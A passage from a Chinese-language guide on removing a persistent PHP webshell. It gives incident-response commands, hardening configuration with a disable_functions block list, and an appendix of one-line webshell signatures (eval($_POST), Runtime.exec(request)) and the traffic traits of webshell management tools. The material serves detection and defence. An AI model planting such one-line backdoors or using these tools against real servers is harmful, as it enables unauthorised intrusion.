- 执行 ps aux | grep php → 发现多个php-fpm进程
- 检查crontab → 发现异常定时任务
- 检查启动项 → 无异常
```

**清除步骤：**

```bash
# 步骤1: 停止Web服务，阻止写入
systemctl stop apache2
# 或 systemctl stop php-fpm

# 步骤2: 查找并杀死不死马进程
# 查找循环执行的PHP进程
ps aux | grep php | grep -v grep
# 查找执行循环写入的进程
ps -ef | grep -E 'ignore_user_abort|while.*true'

# 杀死所有相关进程
pkill -f "php.*shell"
pkill -f "guard"

# 步骤3: 删除Shell文件
# 先锁定文件防止重建（如果进程还活着）
chattr +i /var/www/html/.config.php
rm -f /var/www/html/.config.php
chattr -i /var/www/html/.config.php  # 解锁（如有需要）

# 步骤4: 清除定时任务
crontab -l  # 检查root的crontab
# 编辑并删除异常行
crontab -e
# 检查/etc/cron.d/目录
ls -la /etc/cron.d/
rm -f /etc/cron.d/.hidden

# 步骤5: 检查其他后门
# 检查 .htaccess
cat /var/www/html/.htaccess
# 检查 .user.ini
cat /var/www/html/.user.ini
# 检查所有PHP文件中是否有auto_prepend
grep -rn "eval\|assert\|system" /var/www/html/

# 步骤6: 重启Web服务
systemctl start apache2

# 步骤7: 持续监控
# 设置文件监控
inotifywait -m -r /var/www/html/ -e create,modify
```

**事后加固：**

```ini
; php.ini 安全配置
disable_functions = eval,assert,system,exec,passthru,shell_exec,proc_open,popen
open_basedir = /var/www/html/:/tmp/
allow_url_include = Off
allow_url_fopen = Off
expose_php = Off
```

```apache
# Apache配置：上传目录禁止执行PHP
<Directory "/var/www/html/uploads/">
    php_flag engine off
    <FilesMatch "\.ph(p3?|phtml)$">
        Require all denied
    </FilesMatch>
</Directory>
```

---

## 附录：WebShell速查表

### A. 常见一句话木马特征

| 语言 | 典型特征 | 检测关键词 |
|------|----------|-----------|
| PHP | eval($_POST) | eval+$_POST/assert+$_POST |
| JSP | Runtime.exec(request) | Runtime.exec+getParameter |
| ASP | eval(request()) | eval+request/Execute |
| ASPX | Process.Start(Request) | Process.Start+Request |

### B. 管理工具流量特征速查

| 工具 | 流量特征 | 检测规则 |
|------|----------|----------|
| 菜刀 | 明文Base64命令 | 正则匹配eval+base64 |
| 蚁剑 | 可定制编码 | 编码特征+行为模式 |
| 冰蝎 | AES加密+密钥协商 | 密钥协商+加密统计 |
| Godzilla | 多层加密+Session | 加密流量+会话维持 |

### C. 权限维持检测清单

```
检测项:
□ Web目录文件完整性检查
□ 异常文件（隐藏文件/深路径/异常权限）
□ PHP配置(.htaccess/.user.ini)检查
□ Cron定时任务检查
□ Windows注册表自启动项检查
□ 系统服务列表检查
□ SSH authorized_keys检查
□ Java Filter/Listener/Agent检查
□ 网络连接（反弹Shell）检查
□ 进程派生关系异常检查
```

---

> **免责声明：** 本文档所有技术内容仅用于安全研究、授权渗透测试和防御能力建设。未经授权对他人系统实施攻击行为属于违法行为。请在合法授权范围内使用所学知识。
